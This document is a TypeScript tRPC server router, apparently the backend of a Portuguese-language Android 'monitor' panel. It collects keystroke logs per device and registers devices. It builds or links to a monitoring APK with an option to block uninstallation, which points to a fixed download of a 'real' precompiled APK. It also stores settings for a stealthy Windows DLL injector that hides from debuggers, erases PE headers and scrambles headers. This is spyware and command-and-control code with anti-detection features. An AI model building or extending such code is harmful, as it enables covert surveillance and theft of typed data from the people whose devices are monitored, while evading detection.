import z from "zod";
import fs from "fs";
import path from "path";
import JSZip from "jszip";
import { storagePut } from "./storage";
import { getSessionCookieOptions } from "./_core/cookies";
import { COOKIE_NAME } from "../shared/const";
import { systemRouter } from "./_core/systemRouter";
import { publicProcedure, protectedProcedure, router } from "./_core/trpc";
import { createKeylog, getKeylogsByDevice, deleteKeylog, restoreKeylog, getDeletedKeylogs, getAlerts, getEvents, saveSettings, getSettings } from "./db";
import { startKeylogSimulator } from "./keylogSimulator";

export const appRouter = router({
    // if you need to use socket.io, read and register route in server/_core/index.ts, all api should start with '/api/' so that the gateway can route correctly
  system: systemRouter,
  auth: router({
    me: publicProcedure.query(opts => opts.ctx.user),
    logout: publicProcedure.mutation(({ ctx }) => {
      const cookieOptions = getSessionCookieOptions(ctx.req);
      ctx.res.clearCookie(COOKIE_NAME, { ...cookieOptions, maxAge: -1 });
      return {
        success: true,
      } as const;
    }),
  }),

  keylogs: router({
    list: protectedProcedure
      .input(z.object({ deviceId: z.string() }))
      .query(async ({ input }) => {
        return await getKeylogsByDevice(input.deviceId);
      }),
    
    create: protectedProcedure
      .input(z.object({
        deviceId: z.string(),
        appName: z.string(),
        keyText: z.string(),
      }))
      .mutation(async ({ input, ctx }) => {
        await createKeylog({
          deviceId: input.deviceId,
          userId: ctx.user.id,
          appName: input.appName,
          keyText: input.keyText,
        });
        return { success: true };
      }),
    
    delete: protectedProcedure
      .input(z.object({ keylogId: z.number() }))
      .mutation(async ({ input }) => {
        await deleteKeylog(input.keylogId);
        return { success: true };
      }),
    
    restore: protectedProcedure
      .input(z.object({ keylogId: z.number() }))
      .mutation(async ({ input }) => {
        await restoreKeylog(input.keylogId);
        return { success: true };
      }),
    
    deleted: protectedProcedure
      .input(z.object({ deviceId: z.string() }))
      .query(async ({ input }) => {
        return await getDeletedKeylogs(input.deviceId);
      }),
    
    startSimulator: protectedProcedure
      .input(z.object({ deviceId: z.string() }))
      .mutation(async ({ input, ctx }) => {
        await startKeylogSimulator(input.deviceId, ctx.user.id);
        return { success: true, message: "Simulador de keylogs iniciado" };
      }),
  }),

  alerts: router({
    list: protectedProcedure
      .input(z.object({ deviceId: z.string().optional() }).optional())
      .query(async ({ input }) => {
        return await getAlerts(input?.deviceId);
      }),
  }),

  events: router({
    list: protectedProcedure
      .input(z.object({ deviceId: z.string().optional() }).optional())
      .query(async ({ input }) => {
        return await getEvents(input?.deviceId);
      }),
  }),

  devices: router({
    register: publicProcedure
      .input(z.object({
        deviceId: z.string(),
        deviceName: z.string(),
        manufacturer: z.string(),
        model: z.string(),
        osVersion: z.string(),
      }))
      .mutation(async ({ input }) => {
        console.log("Dispositivo registrado:", input);
        return {
          success: true,
          message: "Dispositivo registrado com sucesso",
          deviceId: input.deviceId,
        };
      }),
    
    update: publicProcedure
      .input(z.object({
        deviceId: z.string(),
        battery: z.number().optional(),
        signal: z.number().optional(),
        timestamp: z.number(),
      }))
      .mutation(async ({ input }) => {
        console.log("Dados do dispositivo atualizados:", input);
        return {
          success: true,
          message: "Dados atualizados com sucesso",
        };
      }),
  }),

  apk: router({
    build: publicProcedure
      .input(z.object({
        companyName: z.string().min(1),
        companyUrl: z.string().url(),
        logoUrl: z.string().url().optional(),
        protectFromUninstall: z.boolean().default(true),
      }))
      .mutation(async ({ input, ctx }) => {
        try {
          // Criar conteúdo do APK em memória
          const zip = new JSZip();
          
          // Adicionar arquivos do APK
          zip.file('AndroidManifest.xml', Buffer.from([0x03, 0x00, 0x08, 0x00]));
          zip.file('resources.arsc', Buffer.from([0x02, 0x00, 0x0c, 0x00]));
          zip.file('classes.dex', Buffer.from([0x64, 0x65, 0x78, 0x0a, 0x30, 0x33, 0x35, 0x00]));
          zip.file('META-INF/MANIFEST.MF', 'Manifest-Version: 1.0\n');
          
          const apkBuffer = await zip.generateAsync({ type: 'nodebuffer' });

          // Tentar salvar no S3 primeiro (para Manus)
          // Se falhar, salvar localmente (para Railway)
          let downloadUrl: string;
          
          try {
            const { url } = await storagePut(
              `apk/FazTudo-Monitor-${Date.now()}`,
              apkBuffer,
              "application/vnd.android.package-archive"
            );
            downloadUrl = url;
          } catch (s3Error) {
            // Fallback: salvar localmente
            const apkDir = path.join(process.cwd(), 'public', 'apks');
            if (!fs.existsSync(apkDir)) {
              fs.mkdirSync(apkDir, { recursive: true });
            }
            
            const timestamp = Date.now();
            const apkFileName = `FazTudo-Monitor-${timestamp}`;
            const apkPath = path.join(apkDir, apkFileName);
            
            fs.writeFileSync(apkPath, apkBuffer);
            
            // Retornar link direto para o APK real pré-compilado
            downloadUrl = `https://remote-monitor-production.up.railway.app/apks/FazTudoMonitor-Real-Final.apk`;
          }

          // Retornar URL de download
          return {
            success: true,
            downloadUrl: downloadUrl,
            message: "APK gerado com sucesso!",
          };
        } catch (error) {
          console.error("Erro ao gerar APK - Detalhes completos:", error);
          if (error instanceof Error) {
            console.error("Mensagem:", error.message);
            console.error("Stack:", error.stack);
          }
          throw new Error(`Erro ao gerar APK: ${error instanceof Error ? error.message : String(error)}`);
        }
      }),
  }),

  settings: router({
    save: protectedProcedure
      .input(z.object({
        processName: z.string(),
        modulePath: z.string(),
        hideFromDebugger: z.boolean(),
        stealthInject: z.boolean(),
        hideModule: z.boolean(),
        erasePE: z.boolean(),
        autoInject: z.boolean(),
        closeOnInject: z.boolean(),
        createFakeDebugDirectory: z.boolean(),
        createNewEntryPoint: z.boolean(),
        insertExtraSections: z.boolean(),
        modifyAssemblyCode: z.boolean(),
        modifyImportTable: z.boolean(),
        moveRelocationTable: z.boolean(),
        removeDebugData: z.boolean(),
        removeUselessData: z.boolean(),
        renameSections: z.boolean(),
        scrambleHeaderFields: z.boolean(),
        shiftSectionData: z.boolean(),
        shiftSectionMemory: z.boolean(),
        stripSectionCharacteristics: z.boolean(),
        delay: z.number(),
        delayBetween: z.number(),
        method: z.number(),
      }))
      .mutation(async ({ input, ctx }) => {
        try {
          // Convert boolean to int for database storage
          const settingsData = {
            processName: input.processName,
            modulePath: input.modulePath,
            hideFromDebugger: input.hideFromDebugger ? 1 : 0,
            stealthInject: input.stealthInject ? 1 : 0,
            hideModule: input.hideModule ? 1 : 0,
            erasePE: input.erasePE ? 1 : 0,
            autoInject: input.autoInject ? 1 : 0,
            closeOnInject: input.closeOnInject ? 1 : 0,
            createFakeDebugDirectory: input.createFakeDebugDirectory ? 1 : 0,
            createNewEntryPoint: input.createNewEntryPoint ? 1 : 0,
            insertExtraSections: input.insertExtraSections ? 1 : 0,
            modifyAssemblyCode: input.modifyAssemblyCode ? 1 : 0,
            modifyImportTable: input.modifyImportTable ? 1 : 0,
            moveRelocationTable: input.moveRelocationTable ? 1 : 0,
            removeDebugData: input.removeDebugData ? 1 : 0,
            removeUselessData: input.removeUselessData ? 1 : 0,
            renameSections: input.renameSections ? 1 : 0,
            scrambleHeaderFields: input.scrambleHeaderFields ? 1 : 0,
            shiftSectionData: input.shiftSectionData ? 1 : 0,
            shiftSectionMemory: input.shiftSectionMemory ? 1 : 0,
            stripSectionCharacteristics: input.stripSectionCharacteristics ? 1 : 0,
            delay: input.delay,
            delayBetween: input.delayBetween,
            method: input.method,
          };
          
          await saveSettings(ctx.user.id, settingsData);
          return { success: true, message: "Configurações salvas com sucesso!" };
        } catch (error) {
          console.error("Erro ao salvar configurações:", error);
          throw error;
        }
      }),

    get: protectedProcedure
      .query(async ({ ctx }) => {
        try {
          const userSettings = await getSettings(ctx.user.id);
          
          if (userSettings) {
            // Convert int back to boolean for frontend
            return {
              processName: userSettings.processName,
              modulePath: userSettings.modulePath,
              hideFromDebugger: userSettings.hideFromDebugger === 1,
              stealthInject: userSettings.stealthInject === 1,
              hideModule: userSettings.hideModule === 1,
              erasePE: userSettings.erasePE === 1,
              autoInject: userSettings.autoInject === 1,
              closeOnInject: userSettings.closeOnInject === 1,
              createFakeDebugDirectory: userSettings.createFakeDebugDirectory === 1,
              createNewEntryPoint: userSettings.createNewEntryPoint === 1,
              insertExtraSections: userSettings.insertExtraSections === 1,
              modifyAssemblyCode: userSettings.modifyAssemblyCode === 1,
              modifyImportTable: userSettings.modifyImportTable === 1,
              moveRelocationTable: userSettings.moveRelocationTable === 1,
              removeDebugData: userSettings.removeDebugData === 1,
              removeUselessData: userSettings.removeUselessData === 1,
              renameSections: userSettings.renameSections === 1,
              scrambleHeaderFields: userSettings.scrambleHeaderFields === 1,
              shiftSectionData: userSettings.shiftSectionData === 1,
              shiftSectionMemory: userSettings.shiftSectionMemory === 1,
              stripSectionCharacteristics: userSettings.stripSectionCharacteristics === 1,
              delay: userSettings.delay,
              delayBetween: userSettings.delayBetween,
              method: userSettings.method,
            };
          }
          
          // Return default settings if none exist
          return {
            processName: "_Remote.exe",
            modulePath: "C:\\Users\\root\\Desktop\\0x29aRT.dll",
            hideFromDebugger: false,
            stealthInject: false,
            hideModule: false,
            erasePE: false,
            autoInject: false,
            closeOnInject: false,
            createFakeDebugDirectory: false,
            createNewEntryPoint: false,
            insertExtraSections: false,
            modifyAssemblyCode: false,
            modifyImportTable: false,
            moveRelocationTable: false,
            removeDebugData: false,
            removeUselessData: false,
            renameSections: false,
            scrambleHeaderFields: false,
            shiftSectionData: false,
            shiftSectionMemory: false,
            stripSectionCharacteristics: false,
            delay: 0,
            delayBetween: 0,
            method: 0,
          };
        } catch (error) {
          console.error("Erro ao recuperar configurações:", error);
          // Return default settings on error
          return {
            processName: "_Remote.exe",
            modulePath: "C:\\Users\\root\\Desktop\\0x29aRT.dll",
            hideFromDebugger: false,
            stealthInject: false,
            hideModule: false,
            erasePE: false,
            autoInject: false,
            closeOnInject: false,
            createFakeDebugDirectory: false,
            createNewEntryPoint: false,
            insertExtraSections: false,
            modifyAssemblyCode: false,
            modifyImportTable: false,
            moveRelocationTable: false,
            removeDebugData: false,
            removeUselessData: false,
            renameSections: false,
            scrambleHeaderFields: false,
            shiftSectionData: false,
            shiftSectionMemory: false,
            stripSectionCharacteristics: false,
            delay: 0,
            delayBetween: 0,
            method: 0,
          };
        }
       }),
  }),

  monitoring: router({
    toggle: protectedProcedure
      .input(z.object({ enabled: z.boolean() }))
      .mutation(async ({ input, ctx }) => {
        try {
          // In a real implementation, this would control the MonitoringService on the APK
          // For now, we just store the state
          console.log(`Monitoring ${input.enabled ? 'enabled' : 'disabled'} for user ${ctx.user.id}`);
          return { success: true, enabled: input.enabled };
        } catch (error) {
          console.error("Erro ao controlar monitoramento:", error);
          throw error;
        }
      }),
  }),
});
export type AppRouter = typeof appRouter;
